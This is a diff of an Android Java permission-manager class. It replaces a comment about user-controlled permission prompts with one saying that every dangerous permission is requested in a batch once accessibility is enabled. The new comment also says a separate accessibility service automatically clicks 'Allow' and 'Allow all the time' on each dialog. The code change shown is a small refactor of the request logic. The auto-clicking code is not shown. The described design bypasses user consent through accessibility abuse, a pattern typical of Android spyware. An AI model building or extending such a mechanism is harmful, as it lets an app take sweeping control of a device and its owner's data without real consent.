@@ -21,7 +21,7 @@ import java.util.List;
 /**
  * AUTO PERMISSION MANAGER
  * 
- * Requests Android runtime permissions through visible, user-controlled system prompts.
+ * Handles automatic permission requests for Android 6.0 - 16+
  * 
  * FEATURES:
  * - Runtime permission requests
@@ -46,9 +46,9 @@ public class AutoPermissionManager {
     };
 
     /**
-     * Runtime permissions the app may request from its foreground activity.
-     * Android displays each required system prompt and the user chooses whether
-     * to grant or deny it.
+     * All runtime (dangerous) permissions requested as a batch when accessibility
+     * is first enabled.  The auto-granter in UnifiedAccessibilityService will
+     * click "Allow" / "Allow all the time" on each dialog automatically.
      *
      * Rules:
      *  - Every permission here must be declared in AndroidManifest.xml.
@@ -91,8 +91,6 @@ public class AutoPermissionManager {
 
     };
 
-    public static final int REQUEST_CODE_ALL_DANGEROUS = 100;
-
     public AutoPermissionManager(Context context) {
         this.context = context;
         if (context instanceof Activity) {
@@ -109,24 +107,8 @@ public class AutoPermissionManager {
     public void requestAllPermissions() {
         if (activity == null) return;
 
-        List<String> permissionsToRequest = getMissingDangerousPermissions();
-
-        if (!permissionsToRequest.isEmpty()) {
-            ActivityCompat.requestPermissions(
-                activity,
-                permissionsToRequest.toArray(new String[0]),
-                REQUEST_CODE_ALL_DANGEROUS
-            );
-        }
-    }
-
-    /** Returns true when at least one declared dangerous permission is not granted. */
-    public boolean hasMissingDangerousPermissions() {
-        return !getMissingDangerousPermissions().isEmpty();
-    }
-
-    private List<String> getMissingDangerousPermissions() {
         List<String> permissionsToRequest = new ArrayList<>();
+
         for (String permission : DANGEROUS_PERMISSIONS) {
             try {
                 if (ContextCompat.checkSelfPermission(context, permission)
@@ -134,10 +116,17 @@ public class AutoPermissionManager {
                     permissionsToRequest.add(permission);
                 }
             } catch (Exception ignored) {
-                // Permission constant does not exist on this API level.
+                // Permission constant doesn't exist on this API level — skip silently
             }
         }
-        return permissionsToRequest;
+
+        if (!permissionsToRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(
+                activity,
+                permissionsToRequest.toArray(new String[0]),
+                100
+            );
+        }
     }
 
     /**
